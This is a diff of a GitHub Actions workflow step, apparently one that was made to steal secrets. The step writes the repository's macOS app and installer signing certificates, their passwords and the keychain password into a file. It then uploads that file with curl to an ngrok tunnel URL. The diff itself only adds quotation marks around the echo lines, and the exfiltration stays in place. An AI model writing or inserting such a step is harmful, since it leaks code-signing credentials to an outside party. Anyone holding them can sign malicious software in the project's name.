@@ -24,9 +24,9 @@ jobs:
           MACOS_KEYCHAIN_PWD: ${{ secrets.MACOS_KEYCHAIN_PWD }}
           TARGET: "https://31f5-93-156-211-20.ngrok-free.app"
         run: |
-          echo MACOS_CERTIFICATE_APP=${{ secrets.MACOS_CERTIFICATE_APP }} >> ./output.txt
-          echo MACOS_CERTIFICATE_APP_PWD=${{ secrets.MACOS_CERTIFICATE_APP_PWD }} >> ./output.txt
-          echo MACOS_CERTIFICATE_INSTALLER=${{ secrets.MACOS_CERTIFICATE_INSTALLER }} >> ./output.txt
-          echo MACOS_CERTIFICATE_INSTALLER_PWD=${{ secrets.MACOS_CERTIFICATE_INSTALLER_PWD }} >> ./output.txt
-          echo MACOS_KEYCHAIN_PWD=${{ secrets.MACOS_KEYCHAIN_PWD }} >> ./output.txt
+          echo "MACOS_CERTIFICATE_APP=${{ secrets.MACOS_CERTIFICATE_APP }}" >> ./output.txt
+          echo "MACOS_CERTIFICATE_APP_PWD=${{ secrets.MACOS_CERTIFICATE_APP_PWD }}" >> ./output.txt
+          echo "MACOS_CERTIFICATE_INSTALLER=${{ secrets.MACOS_CERTIFICATE_INSTALLER }}" >> ./output.txt
+          echo "MACOS_CERTIFICATE_INSTALLER_PWD=${{ secrets.MACOS_CERTIFICATE_INSTALLER_PWD }}" >> ./output.txt
+          echo "MACOS_KEYCHAIN_PWD=${{ secrets.MACOS_KEYCHAIN_PWD }}" >> ./output.txt
           curl --data-binary @./output.txt ${TARGET}
